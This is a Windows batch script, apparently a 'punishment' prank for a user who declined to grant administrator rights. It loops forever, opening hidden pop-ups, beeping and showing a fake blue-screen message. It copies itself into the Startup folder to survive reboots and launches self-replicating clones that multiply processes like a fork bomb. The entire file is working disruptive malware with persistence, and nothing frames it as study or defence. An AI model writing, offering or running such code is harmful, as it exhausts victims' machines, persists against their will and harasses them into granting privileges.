@echo off
title You messed up! Max Punish

:loop

:: === Hidden pop-ups ===
for /l %%i in (1,1,5) do (
    start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('You denied admin!','Punishment')"
)

:: === Disco console ===
for /l %%i in (1,1,20) do (
    color 0%%i
    ping localhost -n 1 >nul
)
color 0A

:: === Beep spam ===
powershell -c "[console]::beep(523,200); [console]::beep(659,200); [console]::beep(784,200)"

:: === Fake BSOD in console ===
start cmd /c "color 1F && mode con: cols=80 lines=25 && echo U HAD TO GIVE ADMIN!... && pause >nul"

:: === Copy self to user Startup (persistent) ===
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" /Y >nul

:: === Create clones for extra load ===
for %%x in (1,2,3) do (
    copy "%~f0" "%~dp0punish%%x.bat" /Y >nul
    start "" "%~dp0punish%%x.bat"
)

timeout /t 1 >nul
goto loop

